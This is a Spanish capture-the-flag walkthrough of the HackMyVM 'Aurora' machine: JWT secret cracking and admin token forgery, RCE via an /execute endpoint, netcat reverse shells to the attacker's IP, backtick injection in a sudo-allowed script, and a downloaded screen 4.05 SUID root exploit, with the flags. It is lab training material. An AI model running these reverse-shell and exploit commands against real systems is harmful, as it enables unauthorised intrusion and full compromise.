# 🖥️ Aurora - HackMyVM

> **Dificultad:** Easy  
> **OS:** Debian (Bullseye)  
> **IP:** 192.168.0.146  
> **Fecha:** 2026-05-17

---

## 📡 Reconocimiento

```bash
sudo arp-scan -l
nmap -sCV -p- --open -T4 192.168.0.146
```

**Puertos abiertos:**
| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22/tcp | SSH | OpenSSH 8.4p1 Debian |
| 3000/tcp | HTTP | Node.js Express framework |

---

## 🌐 Enumeración Web

La raíz devuelve `Cannot GET /` — Express no tiene ruta GET `/`. Enumeramos con **método POST** (clave para apps Express/API):

```bash
gobuster dir -u http://192.168.0.146:3000/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -m POST -t 50
```

**Rutas encontradas:**
| Ruta | Status | Notas |
|------|--------|-------|
| `/login` | 401 | Autenticación requerida |
| `/register` | 400 | Faltan parámetros |
| `/execute` | 401 | RCE — requiere admin |

> ⚠️ **Lección aprendida:** Usar siempre `-m POST` en APIs Node.js/Express. Gobuster con GET no encuentra estas rutas.

---

## 🔑 Acceso a la API

### Registro de usuario

Fuzzeamos el campo `role` en `/register`:

```bash
ffuf -u http://192.168.0.146:3000/register -X POST -H "Content-Type: application/json" -d '{"role":"FUZZ"}' -w /usr/share/seclists/Discovery/Web-Content/api/objects-lowercase.txt -fs 404
```

- `role: admin` → 401 (prohibido)  
- `role: user` → 500 con `Column 'username' cannot be null` → base de datos **SQL** (no MongoDB)

```bash
# El usuario "admin" ya existe en la DB
curl -s -X POST http://192.168.0.146:3000/register -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"hacker123","role":"user"}'
# → Registration OK
```

### Login y JWT

```bash
curl -s -X POST http://192.168.0.146:3000/login -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"hacker123"}'
# → {"accessToken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
```

### Crackeo del secret JWT

```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<payload>.<sig>" > /tmp/jwt.txt
john /tmp/jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256
# → nopassword
```

### Forja del token admin

El payload necesita `username: admin` (existe en DB) + `role: admin`:

```bash
python3 -c "import jwt; print(jwt.encode({'username':'admin','role':'admin','iat':1709519934}, 'nopassword', algorithm='HS256'))"
```

---

## 💥 RCE vía /execute

El parámetro correcto es `command` (no `cmd`):

```bash
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzA5NTE5OTM0fQ.47U7LpOez6J-dRTZPlGWAcz3ZwUTj0K6lAqQFthPK9M"

curl -s -X POST http://192.168.0.146:3000/execute \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"id"}'
# → uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Reverse shell

```bash
# Listener en Kali:
nc -lvnp 4444

# Payload:
curl -s -X POST http://192.168.0.146:3000/execute \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"nc 192.168.0.145 4444 -e /bin/bash"}'
```

---

## 🔺 Escalada: www-data → doro

```bash
sudo -l
# (doro) NOPASSWD: /usr/bin/python3 /home/doro/tools.py *
```

`tools.py` acepta `--ping` y filtra `& ; | > < * ?` pero **no filtra backticks**:

```bash
# Listener en Kali:
nc -lvnp 4321

# En la shell de www-data:
sudo -u doro python3 /home/doro/tools.py --ping
# Enter an IP address: `nc 192.168.0.145 4321 -e /bin/bash`
```

**Flag user:** `ccd839df5504a7ace407b5aeca436e81`

---

## 🔺 Escalada: doro → root

```bash
find / -perm -4000 2>/dev/null
# → /usr/bin/screen (versión 4.05.00)
```

Screen 4.05 es vulnerable a escalada SUID vía `ld.so.preload`. Servimos el exploit desde Kali:

```bash
# En Kali: preparar y servir screenroot.sh
python3 -m http.server 8080 -d /tmp

# En la víctima (doro):
wget http://192.168.0.145:8080/screenroot.sh -O /tmp/screenroot.sh
chmod +x /tmp/screenroot.sh && /tmp/screenroot.sh
# → uid=0(root)
```

**Flag root:** `052cf26a6e7e33790391c0d869e2e40c`

---

## 📋 Resumen

| Fase | Técnica |
|------|---------|
| Reconocimiento | nmap, arp-scan |
| Enumeración API | gobuster `-m POST` → /login, /register, /execute |
| Acceso inicial | Registro + JWT HS256 cracking (john) → forja token admin |
| RCE | POST /execute con parámetro `command` → reverse shell www-data |
| www-data → doro | sudo tools.py + backtick injection (filtro incompleto) |
| doro → root | SUID screen 4.05 → screenroot exploit (ld.so.preload) |
